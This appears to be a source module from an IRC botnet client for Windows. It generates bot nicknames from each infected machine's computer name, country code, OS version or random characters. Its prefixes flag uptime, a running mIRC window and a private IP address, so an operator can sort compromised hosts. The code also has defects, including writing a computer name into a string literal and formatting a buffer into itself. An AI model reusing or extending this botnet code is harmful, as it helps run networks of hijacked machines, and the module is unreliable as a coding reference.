#include "../includes/includes.h"
#include "../includes/extern.h"

RNICK rnick[]={
	{"const", CONSTNICK, rndnickconst},
	{"letter", LETTERNICK, rndnickletter},
	{"comp", COMPNICK, rndnickcomp},
	{"country", COUNTRYNICK, rndnickcountry},
	{"os", OSNICK, rndnickos}
};

char *rndnickconst(char *strbuf)
{
	srand(GetTickCount());

	_snprintf(strbuf, MAXNICKLEN, "%s", nickconst);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);
  
	return (strbuf); 
}

char *rndnickletter(char *strbuf)
{	
    srand(GetTickCount());	

	int randlen = (rand()%3)+maxrand;
	
	for (int i=0; i < randlen; i++) 
		strbuf[i] = (rand()%26)+97;
	strbuf[i] = '\0';

	return (strbuf);
}

char *rndnickcomp(char *strbuf) 
{
    int i;

    LPTSTR lpszCompName="PC";
    DWORD cchBuff = 256;
	BOOL NameGood = FALSE;
 
    srand(GetTickCount());
 
	if(!GetComputerName(lpszCompName, &cchBuff)) 
		lpszCompName="PC";
 
	for (i=65;i<91;i++) 
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    for (i=97;i<123;i++)
		if (lpszCompName[0] == i)
			NameGood = TRUE;
    if (!NameGood) 
		lpszCompName="PC";
    _snprintf(strbuf, MAXNICKLEN, lpszCompName);

    for (i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);
 
	return (strbuf);
}

char *rndnickcountry(char *strbuf)
{
	char temp[10];

    srand(GetTickCount());

	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));
	_snprintf(strbuf, MAXNICKLEN, "%s|", temp);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

char *rndnickos(char *strbuf)
{
	char *os="";
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);

	srand(GetTickCount());

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2K3";
	else os = "sucks";

	_snprintf(strbuf,MAXNICKLEN,"[%s]|",os);

    for (int i=0;i < maxrand;i++) 
		_snprintf(strbuf, MAXNICKLEN, "%s%i", strbuf, rand()%10);

	return (strbuf);
}

char *prefixnick(SOCKET sock,char *strbuf)
{
	char tmpbuf[MAXNICKLEN];

	unsigned int days = GetTickCount() / 86400000;
	if (days > 10)
		#ifndef NO_MIRCNICK
		_snprintf(tmpbuf, sizeof(tmpbuf),"[%d]%s%s", days, ((FindWindow("mIRC",0))?("[M]"):("")),((IsPrivate(GetIP(sock)))?("[F]"):("")));
	else
		_snprintf(tmpbuf, sizeof(tmpbuf),"%s%s", ((FindWindow("mIRC",0))?("[M]"):("")),((IsPrivate(GetIP(sock)))?("[F]"):("")));
		#else
		_snprintf(tmpbuf, sizeof(tmpbuf),"[%d]%s", days,((IsPrivate(GetIP(sock)))?("[F]"):("")));
		#endif

	if (strlen(tmpbuf) > 2) {
		strncat(tmpbuf, strbuf, sizeof(tmpbuf));
		strncpy(strbuf, tmpbuf, MAXNICKLEN);
	}

	return (strbuf);
};

char *rndnick(SOCKET sock,char *strbuf, int type, BOOL prefix, char *name)
{
	for (int i=0; i < (sizeof(rnick) / sizeof(RNICK)); i++)
		if ((name)?(strcmp(name,rnick[i].name)==0):(rnick[i].type == type)) {
			rnick[i].rnfunc(strbuf);
			break;
		}

	return ((prefix)?(prefixnick(sock,strbuf)):(strbuf));
}